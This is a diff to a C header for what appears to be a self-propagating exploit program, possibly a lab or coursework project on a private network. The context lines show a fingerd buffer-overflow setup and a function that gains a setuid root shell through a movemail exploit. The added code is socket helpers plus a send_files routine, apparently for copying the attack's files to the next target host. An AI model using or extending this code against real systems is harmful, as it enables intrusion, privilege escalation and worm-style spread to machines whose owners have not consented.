@@ -8,8 +8,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 
-#define TARGET_IP "172.20.0.10"
-#define TRANSFER_PORT 9999 // added for vector.c w random port number, might need to change.
+#define TARGET_IP "172.20.0.10" // should be the ip of target_prime
 #define FINGERD_PORT 79
 
 // Buffer overflow related things
@@ -184,4 +183,119 @@ void get_root_shell_via_movemail_exploit(int sock, char *io_buf, size_t buf_size
 	// running the shell with setuid bit set
 	write_to_sock(sock, RUN_SHELL);
 }	
+
+/*
+ * 
+ */
+long int get_file_size(FILE *file_ptr) {
+    // checking if the file exist or not
+    if (file_ptr == NULL) {
+        printf("File Not Found!\n");
+        return -1;
+    }
+
+	// seek until the end of file
+    fseek(file_ptr, 0L, SEEK_END);
+
+    // calculating the size of the file
+    long int res = ftell(file_ptr);
+
+	rewind(file_ptr);
+
+    return res;
+}
+
+/* 
+ * from https://stackoverflow.com/questions/9140409/transfer-integer-over-a-socket-in-c
+ *
+ */
+int send_int(int num, int fd) {
+    int32_t conv = htonl(num);
+    char *data = (char*)&conv;
+    int left = sizeof(conv);
+    int rc;
+    do {
+        rc = write(fd, data, left);
+        if (rc < 0) {
+			return -1;
+        }
+        else {
+            data += rc;
+            left -= rc;
+        }
+    }
+    while (left > 0);
+    return 0;
+}
+
+int receive_int(int *num, int fd)
+{
+    int32_t ret;
+    char *data = (char*)&ret;
+    int left = sizeof(ret);
+    int rc;
+    do {
+        rc = read(fd, data, left);
+        if (rc <= 0) { /* instead of ret */
+			return -1;
+        }
+        else {
+            data += rc;
+            left -= rc;
+        }
+    }
+    while (left > 0);
+    *num = ntohl(ret);
+    return 0;
+}
+
+int send_files(
+		int client_sock, 
+		FILE **file_ptrs, 
+		char **file_names, 
+		int num_files,
+		char *file_buf,
+		int buf_size) { 
+	int i;
+	int j;
+	int len;
+	int file_size;
+	int response;
+	char *file_name;
+
+	// communicate number of files to send
+	if (send_int(num_files, client_sock) < 0) return -1;
+	
+	// ensure that the client socket knows how many files to recieve
+	if (receive_int(&response, client_sock) < 0) return -1;
+	if (response != num_files) return -1;
+	printf("Client expecting %d files\n", response);
+	
+	// try to send the files
+	for (i = 0; i < num_files; i++) {	
+		// first send the length of the file name
+		file_name = file_names[i];
+		len = strlen(file_name);
+		if (send_int(len, client_sock)) return -1;
+
+		// actually send the file name 
+		send(client_sock, file_name, len, 0);
+		
+		// send the file and rewind file pointer
+		file_size = get_file_size(file_ptrs[i]);
+		if (file_size < 0) return -1;
+		if (send_int(file_size, client_sock) < 0) return -1; 	
+		while (fgets(file_buf, buf_size, file_ptrs[i]) != NULL) {
+			send(client_sock, file_buf, strlen(file_buf), 0);
+		}	
+		printf("Sent file %s\n", file_name);
+		rewind(file_ptrs[i]);
+
+		// wait until the client says it recieved the file
+		if (receive_int(&j, client_sock) < 0) return -1;
+		if (i != j) return -1;
+	}	
+
+	return 0;
+}
 #endif
